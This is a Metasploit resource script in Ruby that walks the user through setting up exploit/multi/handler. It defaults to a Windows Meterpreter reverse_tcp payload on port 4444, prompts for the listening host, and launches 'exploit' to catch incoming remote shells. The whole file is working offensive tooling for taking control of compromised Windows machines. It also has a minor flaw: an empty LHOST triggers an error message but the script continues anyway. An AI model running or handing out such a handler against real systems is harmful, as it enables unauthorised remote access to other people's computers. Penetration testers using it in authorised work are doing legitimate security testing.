<ruby>
#exploit_multi_handler.rc
#Please report any bugs or suggestions that can help to improve the script.
puts ("\n======================================================================================================")
print_good ("This is a simple script to run exploit/multi/handler.")
run_single("use exploit/multi/handler")
puts ("\n")

#Selecting payload
print_status ("Which type of PAYLOAD would you like to use?")
print_good ("Press ENTER to accept default settings. (windows/meterpreter/reverse_tcp)")
payload = ""
print ("payload: ")
payload = gets.chomp
if payload.empty?
  payload = "windows/meterpreter/reverse_tcp"
  print_good ("Selected: #{payload}")
  run_single ("set payload #{payload}")
else
  print_good ("Selected #{payload}")
  run_single("use #{payload}")
end

#Selecting LHOST
print ("\n")
print_status ("Please specify LHOST.")
print ("LHOST: ")
lhost = gets.chomp
if lhost.empty?
print_error ("Please re-enter LHOST")
end
  print_good ("Selected: #{lhost}")
  run_single("set LHOST #{lhost}")

#Selecting LPORT
print ("\n")
print_status ("Please specify LPORT.")
print_good ("Press ENTER to accept default settings. (4444)")
print ("LPORT: ")
lport = gets.chomp
if lport.empty?
  lport = 4444
  print_good ("Selected: #{lport}")
  run_single ("set LPORT #{lport}")
else
  print_good ("You have selected #{lport}")
  run_single ("set LPORT #{lport}")
end

#Ask user whether to start
print ("\n")
print_status ("Current settings:")
puts ("============================================================")
print_good ("Payload: #{payload}")
print_good ("LHOST = #{lhost}")
print_good ("LPORT = #{lport}")
puts ("============================================================")
print_status ("Do you want to EXPLOIT it now? (y/N)")
input = ""
print("ENTER for yes: ")
input = gets.chomp
  if input == 'y' || input == 'Y' || input.empty?
    print_good ("Exploiting now...")
    run_single ("exploit")
  else
    print_good ("All done. Waiting for orders.")
  end
</ruby>
